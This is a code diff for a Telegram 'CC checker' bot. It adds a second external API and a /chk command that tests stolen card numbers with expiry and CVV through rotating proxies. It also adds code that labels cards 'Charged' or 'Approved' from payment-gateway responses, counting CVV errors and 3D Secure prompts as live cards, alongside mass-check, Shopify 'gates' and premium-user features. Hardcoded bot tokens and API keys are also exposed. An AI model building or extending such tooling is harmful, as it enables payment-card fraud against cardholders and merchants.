@@ -29,6 +29,7 @@ API_HASH = '793db34ba0138f1c174434616a681574'
 BOT_TOKEN = '8966483289:AAHSHzGuTmBDr-DEcpexC1zrf4dLYq0CSX0'
 ADMIN_ID = [6904041366]
 CHECKER_API_URL = 'https://web-production-0919d.up.railway.app/shopify'
+CHECKER_API_URL_2 = 'https://render-ewts.onrender.com/check'   # NEW: dedicated API #2 (no site)
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
@@ -50,7 +51,6 @@ logging.basicConfig(
 # UI TEXT & BUTTON CONFIGURATIONS
 # ==========================================
 
-# MODIFIED: {status} placeholder added so Account Status is dynamic.
 MAIN_MENU_TEXT = (
     "Hello **{name}**,\n"
     "How can I help you today?\n\n"
@@ -87,7 +87,6 @@ COMMANDS_MENU_BUTTONS = [
     [Button.inline("🔙 Back", b"main_menu"), Button.inline("🚫 Close", b"close_menu")]
 ]
 
-# MODIFIED: added /uploadproxy and /uploadsites (new upload commands).
 TOOLS_MENU_TEXT = (
     "🔧 TOOLS MENU\n\n"
     "Available Tools:\n\n"
@@ -751,6 +750,100 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
 
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
+# ==========================================
+# NEW: dedicated API #2 (no site, uses existing proxy system)
+# Endpoint: https://render-ewts.onrender.com/check?cc=<cc>
+# Result dict shape is identical to check_card()
+# ==========================================
+async def check_card_new_api(card, proxy):
+    try:
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
+
+        proxy_str = None
+        if proxy:
+            proxy_parts = proxy.split(':')
+            if len(proxy_parts) == 4:
+                ip, port, user, password = proxy_parts
+                proxy_str = f"{ip}:{port}:{user}:{password}"
+            elif len(proxy_parts) == 2:
+                ip, port = proxy_parts
+                proxy_str = f"{ip}:{port}"
+            else:
+                proxy_str = proxy
+
+        url = f'{CHECKER_API_URL_2}?cc={card}'
+        if proxy_str:
+            url += f'&proxy={proxy_str}'
+
+        timeout = aiohttp.ClientTimeout(total=100)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
+                try:
+                    raw = await resp.json()
+                except:
+                    text = await resp.text()
+                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
+
+        response_msg = raw.get('Response', '') or ''
+        price = raw.get('Price', '-')
+        if price != '-' and price != 0:
+            price = f"${price}"
+        gateway = raw.get('Gateway', 'Unknown') or 'Unknown'
+        status_flag = raw.get('Status', False)
+
+        response_lower = response_msg.lower()
+
+        if 'charged' in response_lower or 'order_placed' in response_lower:
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
+        elif 'thank you' in response_lower or 'payment successful' in response_lower:
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
+        elif status_flag is True:
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
+        elif any(key in response_lower for key in [
+            'approved', 'success',
+            'insufficient_funds', 'insufficient funds',
+            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
+            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
+            'incorrect_zip', 'incorrect zip', 'cvv issue',
+            '3d', '3d secure', 'otp', 'verification required',
+            'authenticate', 'authentication required', 'challenge required',
+            'redirecting to bank', 'bank verification', 'send code',
+            'enter code', 'verify'
+        ]):
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
+        else:
+            return {'status': 'Dead', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
+
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
+    except Exception as e:
+        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
+async def check_card_new_api_with_retry(card, proxies, max_retries=2):
+    last_result = None
+    if not proxies:
+        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
+    for attempt in range(max_retries):
+        proxy = random.choice(proxies)
+        result = await check_card_new_api(card, proxy)
+
+        if not result.get('retry'):
+            return result
+
+        last_result = result
+        if attempt < max_retries - 1:
+            await asyncio.sleep(0.3)
+
+    if last_result:
+        return {'status': 'Dead', 'message': f'API errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-')}
+
+    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
 async def send_realtime_hit(user_id, result, hit_type, username):
     status_text = "🔥 CHARGED" if hit_type == "Charged" else "✅ APPROVED"
     brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
@@ -928,7 +1021,6 @@ async def start_handler(event):
     name = sender.first_name if sender.first_name else "User"
     user_id = event.sender_id
     
-    # MODIFIED: dynamic account status (no auto-registration)
     status = "REGISTERED" if is_registered(user_id) else "Not Registered"
     text = MAIN_MENU_TEXT.format(name=name, user_id=user_id, status=status)
     gif_url = "https://media.giphy.com/media/OjmOAwVgHvS855nl6K/giphy.gif"
@@ -959,7 +1051,6 @@ async def callback_handler(event):
         sender = await event.get_sender()
         name = sender.first_name if sender.first_name else "User"
         user_id = event.sender_id
-        # MODIFIED: dynamic status
         status = "REGISTERED" if is_registered(user_id) else "Not Registered"
         text = MAIN_MENU_TEXT.format(name=name, user_id=user_id, status=status)
         await event.edit(text, buttons=MAIN_MENU_BUTTONS, parse_mode='md')
@@ -983,7 +1074,6 @@ async def callback_handler(event):
     elif data == "menu_gates":
         await event.edit(GATES_MENU_TEXT, buttons=GATES_MENU_BUTTONS, parse_mode='md')
         
-    # --- SHOPIFY GATES PAGINATION ---
     elif data == "gate_shopify":
         await event.edit(SHOPIFY_P1_TEXT, buttons=SHOPIFY_P1_BUTTONS, parse_mode='md')
     elif data == "shopify_p1":
@@ -991,7 +1081,6 @@ async def callback_handler(event):
     elif data == "shopify_p2":
         await event.edit(SHOPIFY_P2_TEXT, buttons=SHOPIFY_P2_BUTTONS, parse_mode='md')
 
-    # --- CHARGE GATES PAGINATION ---
     elif data == "gate_charge":
         await event.edit(CHARGE_P1_TEXT, buttons=CHARGE_P1_BUTTONS, parse_mode='md')
     elif data == "charge_p1":
@@ -1001,13 +1090,11 @@ async def callback_handler(event):
     elif data == "charge_p3":
         await event.edit(CHARGE_P3_TEXT, buttons=CHARGE_P3_BUTTONS, parse_mode='md')
         
-    # --- EXISTING AUTH GATES PAGINATION ---
     elif data == "gate_auth_p1":
         await event.edit(AUTH_P1_TEXT, buttons=AUTH_P1_BUTTONS, parse_mode='md')
     elif data == "gate_auth_p2":
         await event.edit(AUTH_P2_TEXT, buttons=AUTH_P2_BUTTONS, parse_mode='md')
         
-    # --- EXISTING MASS CHECKER PAGINATION ---
     elif data == "gate_mass_p1":
         await event.edit(MASS_P1_TEXT, buttons=MASS_P1_BUTTONS, parse_mode='md')
     elif data == "gate_mass_p2":
@@ -1018,7 +1105,6 @@ async def callback_handler(event):
     elif data == "gate_premium":
         await event.answer("Premium Gates menu coming soon!", alert=True)
 
-    # MODIFIED: menu_register is now fully functional (no auto-registration, only on click)
     elif data == "menu_register":
         user_id = event.sender_id
         if is_registered(user_id):
@@ -1054,7 +1140,6 @@ async def callback_handler(event):
 @client.on(events.NewMessage(pattern=r'^/cc\s+'))
 async def single_cc_check(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     try:
@@ -1119,7 +1204,6 @@ async def single_cc_check(event):
 @client.on(events.NewMessage(pattern='/chk'))
 async def check_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     try:
@@ -1132,6 +1216,53 @@ async def check_command(event):
         await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
         return
 
+    # NEW: single-card form "/chk cc|mm|yy|cvv" → uses dedicated API #2 (no site)
+    #        Output format is identical to /cc.
+    _msg_text = event.message.text or ''
+    if _msg_text.startswith('/chk '):
+        _arg = _msg_text[5:].strip()
+        _cards = extract_cc(_arg)
+        if not _cards:
+            await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/chk card|mm|yy|cvv</code>"), parse_mode='html')
+            return
+        _card = _cards[0]
+        _proxies = load_proxies()
+        if not _proxies:
+            await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
+            return
+
+        _status_msg = await event.reply(premium_emoji(f"🔄 Checking <code>{_card}</code>..."), parse_mode='html')
+        try:
+            _result = await check_card_new_api_with_retry(_card, _proxies, max_retries=3)
+            _brand, _bin_type, _level, _bank, _country, _flag = await get_bin_info(_card.split('|')[0])
+
+            if _result['status'] == 'Charged':
+                _status_header = "💎 CHARGED"
+            elif _result['status'] == 'Approved':
+                _status_header = "✅ APPROVED"
+            else:
+                _status_header = "❌ DECLINED"
+
+            _final_resp = f"""{_status_header}
+
+💳 CC <code>{_result['card']}</code>
+
+🛒 Gateway {_result.get('gateway', 'Unknown')}
+📝 Response {_result['message'][:150]}
+💸 Price {_result.get('price', '-')}
+
+🆔 BIN Info {_brand} - {_bin_type} - {_level}
+🏦 Bank {_bank}
+🥰 Country {_country} {_flag}
+
+💡 Made by @The_Test_Us
+"""
+            await _status_msg.edit(premium_emoji(_final_resp), parse_mode='html')
+        except Exception as e:
+            await _status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+        return
+
+    # EXISTING mass-check flow (unchanged)
     if not event.reply_to_msg_id:
         await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
         return
@@ -1265,7 +1396,6 @@ async def check_command(event):
 @client.on(events.NewMessage(pattern='/addproxy'))
 async def add_proxy_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1299,9 +1429,6 @@ async def add_proxy_command(event):
     except Exception as e:
         await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
 
-# ==========================================
-# NEW: /uploadproxy  — upload & replace proxy.txt
-# ==========================================
 @client.on(events.NewMessage(pattern='/uploadproxy'))
 async def upload_proxy_command(event):
     user_id = event.sender_id
@@ -1343,7 +1470,6 @@ async def upload_proxy_command(event):
             for line in lines:
                 await f.write(f"{line}\n")
 
-        # Verify the write
         saved = load_proxies()
         await status_msg.edit(
             premium_emoji(f"✅ <b>proxy.txt uploaded successfully!</b>\n\n"
@@ -1366,7 +1492,6 @@ async def upload_proxy_command(event):
 @client.on(events.NewMessage(pattern='/proxy'))
 async def proxy_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1410,7 +1535,6 @@ async def proxy_command(event):
 @client.on(events.NewMessage(pattern='/chkproxy\s+'))
 async def check_single_proxy(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1436,7 +1560,6 @@ async def check_single_proxy(event):
 @client.on(events.NewMessage(pattern='/rmproxy\s+'))
 async def remove_single_proxy(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1463,7 +1586,6 @@ async def remove_single_proxy(event):
 @client.on(events.NewMessage(pattern='/rmproxyindex\s+'))
 async def remove_proxy_by_index(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1508,7 +1630,6 @@ async def remove_proxy_by_index(event):
 @client.on(events.NewMessage(pattern='/clearproxy'))
 async def clear_all_proxies(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1549,7 +1670,6 @@ async def clear_all_proxies(event):
 @client.on(events.NewMessage(pattern='/getproxy'))
 async def get_all_proxies(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1579,7 +1699,6 @@ async def get_all_proxies(event):
 @client.on(events.NewMessage(pattern='/site'))
 async def site_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1632,7 +1751,6 @@ async def site_command(event):
 @client.on(events.NewMessage(pattern='/rm\s+'))
 async def remove_site_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_premium(user_id):
@@ -1663,7 +1781,6 @@ async def remove_site_command(event):
 @client.on(events.NewMessage(pattern='/addsites'))
 async def add_sites_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_admin(user_id):
@@ -1749,9 +1866,6 @@ async def add_sites_command(event):
             except:
                 pass
 
-# ==========================================
-# NEW: /uploadsites  — upload & replace sites.txt
-# ==========================================
 @client.on(events.NewMessage(pattern='/uploadsites'))
 async def upload_sites_command(event):
     user_id = event.sender_id
@@ -1815,7 +1929,6 @@ async def upload_sites_command(event):
 @client.on(events.NewMessage(pattern='/addpremium'))
 async def add_premium_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_admin(user_id):
@@ -1844,7 +1957,6 @@ async def add_premium_command(event):
 @client.on(events.NewMessage(pattern='/removepremium'))
 async def remove_premium_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_admin(user_id):
@@ -1876,7 +1988,6 @@ async def remove_premium_command(event):
 @client.on(events.NewMessage(pattern='/listpremium'))
 async def list_premium_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_admin(user_id):
@@ -1894,7 +2005,6 @@ async def list_premium_command(event):
 @client.on(events.NewMessage(pattern='/stats'))
 async def stats_command(event):
     user_id = event.sender_id
-    # NEW: registration gate
     if not await _require_reg(event):
         return
     if not is_admin(user_id):
@@ -1904,7 +2014,7 @@ async def stats_command(event):
     premium_users = load_premium_users()
     sites = load_sites()
     proxies = load_proxies()
-    registered = load_registered_users()   # NEW: show registered user count
+    registered = load_registered_users()
     
     stats_text = f"""📊 <b>Bot Statistics</b>
 
@@ -1923,7 +2033,6 @@ async def stats_command(event):
 async def main():
     print("Starting bot...")
     await client.start(bot_token=BOT_TOKEN)
-    # NEW: ensure admins are registered once on startup (persists in registered_users.txt)
     await ensure_admins_registered()
     print("Bot is up and running!")
     await client.run_until_disconnected()
